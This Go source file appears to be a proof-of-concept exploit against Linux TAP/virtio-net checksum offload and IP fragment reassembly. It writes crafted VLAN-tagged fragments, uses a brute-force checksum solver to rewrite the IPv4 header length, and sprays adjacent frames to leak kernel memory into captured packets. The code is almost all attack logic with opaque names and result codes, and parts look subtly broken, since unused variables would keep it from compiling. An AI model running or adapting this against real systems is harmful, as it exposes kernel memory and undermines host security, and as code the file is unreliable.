
package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	iffTap      = 0x0002
	iffNoPI     = 0x1000
	iffVnetHdr  = 0x4000
	tunSetIFF   = 0x400454ca
	tunSetSndBuf = 0x400454d4
	needsCsum   = 1

	ethLen     = 14
	vlanLen    = 4
	ipLen      = 20
	l2Len      = ethLen + vlanLen + vlanLen 
	csumAtIP   = l2Len
	vlanProto  = 0x8100
	ipProtoEth = 0x0800

	fragPayload = 8
	restPayload = 400
	marker      = 0xa5
	ipID        = 0x9999
)

func main() {
	if os.Geteuid() != 0 {
		os.Exit(1)
	}
	cfg := parseCfg()
	if err := run(cfg); err != nil {
		os.Exit(1)
	}
}

type cfg struct {
	head      int
	rest      int
	tebar     int
	tebarFill byte
	page      bool
	skipVerify bool
}

func parseCfg() cfg {
	c := cfg{}
	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
	flag.IntVar(&c.tebar, "tebar", 0, "same-sized frames to allocate immediately before the head skb")
	fill := flag.Int("tebar-fill", 0xee, "byte stored in tebar frames")
	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
	flag.Parse()
	c.tebarFill = byte(*fill)
	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
		os.Exit(1)
	}
	if c.rest < 16 {
		fmt.Fprintln(os.Stderr, "-rest must be at least 16")
		os.Exit(1)
	}
	return c
}

func run(c cfg) error {
	tapName := getenv("PWN_TAP", "pwntap")
	capName := getenv("PWN_CAP", "pwnv1")
	if _, err := net.InterfaceByName(tapName); err != nil {
		return fmt.Errorf("tap %s is not present: %w", tapName, err)
	}
	if _, err := net.InterfaceByName(capName); err != nil {
		return fmt.Errorf("capture iface %s is missing: %w", capName, err)
	}
	tap, err := openTap(tapName, c.page)
	if err != nil {
		return fmt.Errorf("attach %s: %w", tapName, err)
	}
	defer tap.Close()

	cap, err := listen(capName)
	if err != nil {
		return err
	}
	defer cap.Close()

	if !c.skipVerify {
		if err := verifyWrite(tap, cap); err != nil {
			return err
		}
	}
	return bali(tap, cap, c)
}

func verifyWrite(tap *os.File, cap *capture) error {
	payload := bytesRepeat(300, 0x5a)
	if !testo(payload, 0x1111) {
		return errors.New("solver found no 0x4f00 adjustment")
	}
	pkt := datagram(0x1111, payload)
	if err := writeTap(tap, frame(pkt), true, csumAtIP); err != nil {
		return err
	}
	got := cap.collect(500*time.Millisecond, 0x1111)
	if len(got) == 0 {
		return errors.New("verify: no fragment captured")
	}
	if got[0][0] != 0x4f {
		return fmt.Errorf("verify: wanted 0x4f, got 0x%02x", got[0][0])
	}
	return nil
}

func bali(tap *os.File, cap *capture, c cfg) error {
	payload := make([]byte, c.head+c.rest)
	for i := 0; i < c.head; i++ {
		payload[i] = marker
	}
	for i := c.head; i < len(payload); i++ {
		payload[i] = 0x11
	}
	if !testo(payload, ipID) {
		return errors.New("solver found no 0x4f00 adjustment")
	}
	printHead(c)
	second := frame(fragment(c.head, false, payload[c.head:]))
	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
		return err
	}
	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
	for i := 0; i < c.tebar; i++ {
		if err := writeTap(tap, tebar, false, 0); err != nil {
			return err
		}
	}
	first := frame(fragment(0, true, payload[:c.head]))
	if err := writeTap(tap, first, true, csumAtIP); err != nil {
		return err
	}
	pkts := cap.collect(800*time.Millisecond, ipID)
	if len(pkts) == 0 {
		return errors.New("no fragment captured")
	}
	var balied, mutated bool
	for i, ip := range pkts {
		ihl := int(ip[0]&0x0f) * 4
		if ip[0] != 0x4f {
			continue
		}
		mutated = true
		extra := ip[ipLen:ihl]
		host := extra[c.head:]
		nonzero := 0
		for _, b := range host {
			if b != 0 {
				nonzero++
			}
		}
		if len(host) > 0 {
			balied = true
		}
	}
	switch {
	case balied:
		fmt.Println("123")
	case mutated:
		fmt.Println("456")
	default:
		fmt.Println("678")
	}
	return nil
}

func testo(payload []byte, id uint16) bool {
	const adj = 32 
	if adj+1 >= ipLen+len(payload) {
		return false
	}
	off := adj - ipLen
	for w := 0; w < 65536; w++ {
		payload[off] = byte(w)
		payload[off+1] = byte(w >> 8)
		pkt := datagram(id, payload)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == 0x004f {
			return true
		}
	}
	return false
}

func datagram(id uint16, payload []byte) []byte {
	return fragment(0, false, payload, id)
}

func fragment(offset int, more bool, payload []byte, idOpt ...uint16) []byte {
	id := uint16(ipID)
	if len(idOpt) > 0 {
		id = idOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = 253
	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func forwardTTL(pkt []byte) {
	raw := uint32(pkt[10]) | uint32(pkt[11])<<8
	raw += 0x0001
	if raw >= 0xFFFF {
		raw++
	}
	pkt[8]--
	pkt[10] = byte(raw)
	pkt[11] = byte(raw >> 8)
}
func frame(ip []byte) []byte {
	f := make([]byte, l2Len+len(ip))
	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	binary.BigEndian.PutUint16(f[14:], 0)
	binary.BigEndian.PutUint16(f[16:], vlanProto)
	binary.BigEndian.PutUint16(f[18:], 0)
	binary.BigEndian.PutUint16(f[20:], ipProtoEth)
	copy(f[l2Len:], ip)
	return f
}

func writeTap(tap *os.File, frame []byte, csum bool, start uint16) error {
	buf := make([]byte, 10+len(frame))
	if csum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
	}
	copy(buf[10:], frame)
	for {
		_, err := tap.Write(buf)
		if err == nil || !errors.Is(err, syscall.EAGAIN) {
			return err
		}
		time.Sleep(time.Millisecond)
	}
}

type capture struct{ fd int }

func listen(ifname string) (*capture, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return nil, err
	}
	ifi, err := net.InterfaceByName(ifname)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(syscall.ETH_P_ALL), Ifindex: ifi.Index}); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 100000})
	return &capture{fd: fd}, nil
}

func (c *capture) Close() { syscall.Close(c.fd) }

func (c *capture) collect(d time.Duration, id uint16) [][]byte {
	deadline := time.Now().Add(d)
	var out [][]byte
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
				continue
			}
			break
		}
		ip := ipv4Of(buf[:n])
		if ip == nil || binary.BigEndian.Uint16(ip[4:]) != id {
			continue
		}
		out = append(out, append([]byte(nil), ip...))
	}
	return out
}

func ipv4Of(frame []byte) []byte {
	if len(frame) < ethLen {
		return nil
	}
	off := ethLen
	proto := binary.BigEndian.Uint16(frame[12:])
	for proto == vlanProto {
		if len(frame) < off+vlanLen {
			return nil
		}
		proto = binary.BigEndian.Uint16(frame[off+2:])
		off += vlanLen
	}
	if proto != ipProtoEth || len(frame) < off+ipLen {
		return nil
	}
	return frame[off:]
}

func openTap(name string, page bool) (*os.File, error) {
	flags := os.O_RDWR
	if page {
		flags |= syscall.O_NONBLOCK
	}
	f, err := os.OpenFile("/dev/net/tun", flags, 0)
	if err != nil {
		return nil, err
	}
	var req [64]byte
	copy(req[:], name)
	*(*uint16)(unsafe.Pointer(&req[16])) = iffTap | iffNoPI | iffVnetHdr
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetIFF, uintptr(unsafe.Pointer(&req[0]))); errno != 0 {
		f.Close()
		return nil, fmt.Errorf("TUNSETIFF: %w", errno)
	}
	if page {
		snd := int32(0x7fffffff)
		if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetSndBuf, uintptr(unsafe.Pointer(&snd))); errno != 0 {
			f.Close()
			return nil, fmt.Errorf("TUNSETSNDBUF: %w", errno)
		}
	}
	return f, nil
}

func printHead(c cfg) {
	frameLen := l2Len + ipLen + c.head
	past := 60 - (ipLen + c.head)
	via := "slab skb (tun_alloc_skb)"
	if c.page {
		via = "page_frag skb (tun_build_skb)"
	}
}

func ipChecksum(h []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(h); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(h[i:]))
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func csumPartial(b []byte) uint32 {
	var sum uint32
	i := 0
	for ; i+1 < len(b); i += 2 {
		sum += uint32(b[i]) | uint32(b[i+1])<<8
	}
	if i < len(b) {
		sum += uint32(b[i])
	}
	return sum
}

func csumFold(sum uint32) uint16 {
	sum = (sum & 0xffff) + (sum >> 16)
	sum = (sum & 0xffff) + (sum >> 16)
	return ^uint16(sum)
}

func bytesRepeat(n int, b byte) []byte {
	p := make([]byte, n)
	for i := range p {
		p[i] = b
	}
	return p
}

func getenv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func htons(v uint16) uint16 { return v<<8 | v>>8 }
